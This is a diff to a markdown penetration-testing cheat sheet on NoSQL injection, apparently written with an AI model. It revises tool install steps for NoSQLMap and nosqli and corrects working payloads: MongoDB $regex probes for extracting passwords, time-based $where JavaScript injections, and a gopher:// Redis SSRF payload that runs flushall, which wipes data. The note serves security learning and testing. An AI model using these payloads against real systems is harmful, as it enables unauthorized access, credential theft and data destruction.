@@ -8,7 +8,7 @@ NoSQL databases (MongoDB, Redis, CouchDB, Cassandra) don't use SQL — they use 
 
 **Most common target: MongoDB** — widely used, operator injection is well-understood.
 
-**Key difference from SQLi:** Instead of breaking out of string quotes, you inject JSON operators like `$ne`, `$gt`, `$regex` to change query logic.
+**Key difference from SQLi:** Instead of breaking out of string quotes, you inject JSON operators like `$ne`, `$gt`, `$regex` to change query logic. Pairs with [[SQL Injection]], [[GraphQL]], [[Server-Side Attacks]].
 
 ---
 
@@ -19,7 +19,7 @@ NoSQL databases (MongoDB, Redis, CouchDB, Cassandra) don't use SQL — they use 
 | `NoSQLMap` | Automated MongoDB injection and exploitation |
 | `Burp Suite` | Manual operator injection testing |
 | `mongosh` | MongoDB shell — test payloads directly |
-| `nosql-detective` | MongoDB injection scanner |
+| `nosqli` | NoSQL injection scanner — `github.com/Charlie-belmer/nosqli` |
 
 ---
 
@@ -49,7 +49,7 @@ NoSQL databases (MongoDB, Redis, CouchDB, Cassandra) don't use SQL — they use 
 
 **Basic probes:**
 
-```bash
+```text
 '
 "
 {
@@ -134,6 +134,8 @@ False = login fails / different response.
 
 ### Extract passwords
 
+> [!note] This only recovers cleartext if the password is stored in plaintext. If it's hashed (the norm), `$regex` matches against the **hash**, so you extract hash chars — useful for offline cracking, not a direct password read.
+
 ```json
 {"username": "admin", "password": {"$regex": "^a"}}
 {"username": "admin", "password": {"$regex": "^s"}}
@@ -162,14 +164,15 @@ If MongoDB is configured with `$where` support (older versions):
 
 ```json
 {"username": "admin", "$where": "this.password.length > 0"}
-{"$where": "sleep(5000)"}
 {"$where": "1==1"}
 {"$where": "function() { return true; }"}
 ```
 
-**Time-based blind via $where:**
+**Time-based blind via $where:** `sleep()` is a *mongo shell* helper and is **not** available in the server-side `$where` JS context — use a busy-loop to burn wall-clock time instead:
+
 ```json
-{"username": "admin", "$where": "if(this.password[0]=='a') { sleep(5000); return true; } else { return false; }"}
+{"$where": "var d=Date.now(); while(Date.now()-d<5000){}; return true;"}
+{"username": "admin", "$where": "if(this.password[0]=='a'){var d=Date.now();while(Date.now()-d<5000){}} return true;"}
 ```
 
 > `$where` is disabled by default in modern MongoDB. Worth trying on older boxes.
@@ -179,21 +182,21 @@ If MongoDB is configured with `$where` support (older versions):
 ## NoSQLMap (Tool)
 
 ```bash
-# Install
-pip install nosqlmap
-# or: git clone https://github.com/codingo/NoSQLMap
+# Install (git-clone, Python 2 — not a PyPI package)
+git clone https://github.com/codingo/NoSQLMap && cd NoSQLMap
+pip2 install -r requirements.txt
 
-# Run interactive
-python nosqlmap.py
-
-# Direct scan
-python nosqlmap.py -u http://target.com/login --attack 1
+# Menu-driven — launch and pick options interactively
+python2 nosqlmap.py
 ```
 
-**Attack modes:**
-- 1 = MongoDB server attack
-- 2 = Web app NoSQLi
-- 3 = Scan for MongoDB
+**Menu options (interactive):**
+- 1 = Set target host/port
+- 2 = NoSQL DB access attacks (MongoDB server)
+- 3 = Web app attacks (NoSQLi)
+- 4 = Scan for anonymous MongoDB access
+
+> [!tip] NoSQLMap is dated/py2. For modern web-focused NoSQLi, `nosqli` (Go) is a lighter alternative: `nosqli scan -t http://target/login`.
 
 ---
 
@@ -227,8 +230,8 @@ HGET users:* \r\nSET injected value\r\n
 # If injectable in web param
 ?key=foo\r\nSET injected "pwned"\r\n
 
-# If Redis SSRF via Gopher
-gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+# If Redis SSRF via Gopher (fully percent-encode * and $ too — see next block)
+gopher://127.0.0.1:6379/_%2A1%0d%0a%248%0d%0aflushall%0d%0a
 ```
 
 **Common Redis attack via SSRF:**
@@ -349,7 +352,7 @@ $gt → %24gt
    - Work through username, then password
 
 5. Check $where (JS injection)
-   - {"$where": "sleep(5000)"} — time-based blind
+   - {"$where": "var d=Date.now();while(Date.now()-d<5000){};return true"} — time-based (busy-loop; sleep() unavailable in $where)
    - Only works on older/misconfigured MongoDB
 
 6. Automate
@@ -364,5 +367,5 @@ $gt → %24gt
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-14*
+*Updated: 2026-07-21*
 *Model: claude-sonnet-4-6*
